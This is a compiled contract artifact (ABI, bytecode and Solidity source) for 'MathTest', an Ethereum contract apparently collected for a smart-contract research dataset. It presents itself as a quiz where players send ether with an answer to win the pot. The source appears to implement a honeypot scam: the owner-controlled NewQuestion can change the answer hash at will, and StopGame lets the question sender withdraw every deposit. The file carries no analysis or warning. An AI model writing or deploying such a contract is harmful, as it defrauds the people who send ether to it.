{
  "contractName": "MathTest",
  "abi": [
    {
      "constant": true,
      "inputs": [],
      "name": "question",
      "outputs": [
        {
          "name": "",
          "type": "string"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "minBet",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "payable": true,
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "_response",
          "type": "string"
        }
      ],
      "name": "Try",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "_question",
          "type": "string"
        },
        {
          "name": "_response",
          "type": "bytes32"
        },
        {
          "name": "_count",
          "type": "uint256"
        }
      ],
      "name": "start_quiz_game",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "StopGame",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "_question",
          "type": "string"
        },
        {
          "name": "_responseHash",
          "type": "bytes32"
        }
      ],
      "name": "NewQuestion",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "newAddress",
          "type": "address"
        }
      ],
      "name": "newQuestioner",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x6080604052662386f26fc100006002600454020260015534801561002257600080fd5b506107b2806100326000396000f300608060405260043610610083576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff1680633853682c146100855780633e3ee859146100b35780633fad9ae01461011d57806359988dce146101ad5780639619367d146101f05780639995aafd1461021b578063f50ab2471461028f575b005b6100b1600480360381019080803590602001908201803590602001919091929391929390505050610299565b005b61011b600480360381019080803590602001908201803590602001908080601f016020809104026020016040519081016040528093929190818152602001838380828437820191505050505050919291929080356000191690602001909291905050506103dd565b005b34801561012957600080fd5b5061013261045f565b6040518080602001828103825283818151815260200191508051906020019080838360005b83811015610172578082015181840152602081019050610157565b50505050905090810190601f16801561019f5780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b3480156101b957600080fd5b506101ee600480360381019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291905050506104fd565b005b3480156101fc57600080fd5b5061020561059d565b6040518082815260200191505060405180910390f35b61028d600480360381019080803590602001908201803590602001908080601f01602080910402602001604051908101604052809392919081815260200183838082843782019150505050505091929192908035600019169060200190929190803590602001909291905050506105a3565b005b610297610625565b005b3273ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161415156102d357600080fd5b8181604051602001808383808284378201915050925050506040516020818303038152906040526040518082805190602001908083835b60208310151561032f578051825260208201915060208101905060208303925061030a565b6001836020036101000a03801982511681845116808217855250505050505090500191505060405180910390206000191660035460001916148015610375575060015434115b156103d9573373ffffffffffffffffffffffffffffffffffffffff166108fc3073ffffffffffffffffffffffffffffffffffffffff16319081150290604051600060405180830381858888f193505050501580156103d7573d6000803e3d6000fd5b505b5050565b600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614151561043957600080fd5b816000908051906020019061044f9291906106e1565b5080600381600019169055505050565b60008054600181600116156101000203166002900480601f0160208091040260200160405190810160405280929190818152602001828054600181600116156101000203166002900480156104f55780601f106104ca576101008083540402835291602001916104f5565b820191906000526020600020905b8154815290600101906020018083116104d857829003601f168201915b505050505081565b600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614151561055957600080fd5b80600260006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050565b60015481565b600060010260035460001916141561062057816003816000191690555082600090805190602001906105d69291906106e1565b508060048190555033600260006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505b505050565b600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614151561068157600080fd5b3373ffffffffffffffffffffffffffffffffffffffff166108fc3073ffffffffffffffffffffffffffffffffffffffff16319081150290604051600060405180830381858888f193505050501580156106de573d6000803e3d6000fd5b50565b828054600181600116156101000203166002900490600052602060002090601f016020900481019282601f1061072257805160ff1916838001178555610750565b82800160010185558215610750579182015b8281111561074f578251825591602001919060010190610734565b5b50905061075d9190610761565b5090565b61078391905b8082111561077f576000816000905550600101610767565b5090565b905600a165627a7a72305820f280702c80a95b628937b32ddb99e11df28ff9d5a4cdd9d92df95581760639820029",
  "source": "\n\ncontract MathTest\n{\n    function Try(string _response) external payable {\n        require(msg.sender == tx.origin);\n        \n        if(responseHash == keccak256(abi.encodePacked(_response)) && msg.value>minBet)\n        {\n            msg.sender.transfer(address(this).balance);\n        }\n    }\n\n    string public question;\n    uint256 public minBet = count * 2 * 10 finney;\n    \n    address questionSender;\n    \n    bytes32 responseHash;\n \n    uint count;\n    \n    function start_quiz_game(string _question,bytes32 _response, uint _count) public payable {\n        if(responseHash==0x0) \n        {\n            responseHash = _response;\n            question = _question;\n            count = _count;\n            questionSender = msg.sender;\n        }\n    }\n    \n    function StopGame() public payable onlyQuestionSender {\n       msg.sender.transfer(address(this).balance);\n    }\n    \n    function NewQuestion(string _question, bytes32 _responseHash) public payable onlyQuestionSender {\n        question = _question;\n        responseHash = _responseHash;\n    }\n    \n    function newQuestioner(address newAddress) public onlyQuestionSender{\n        questionSender = newAddress;\n    }\n    \n    modifier onlyQuestionSender(){\n        require(msg.sender==questionSender);\n        _;\n    }\n    \n    function() public payable{}\n}",
  "sourcePath": "/home/XXX-1/smartrim-experiment/for-rlf/0x8be54acd944f301eb0185ea48fe03914d99e83b8/contracts/0x8be54acd944f301eb0185ea48fe03914d99e83b8.sol",
  "compiler": {
    "name": "solc",
    "version": "0.4.25+commit.59dbf8f1.Emscripten.clang"
  },
  "schemaVersion": "3.4.16",
  "updatedAt": "2025-08-14T04:00:13.617Z",
  "networkType": "ethereum",
  "devdoc": {
    "methods": {}
  },
  "userdoc": {
    "methods": {}
  }
}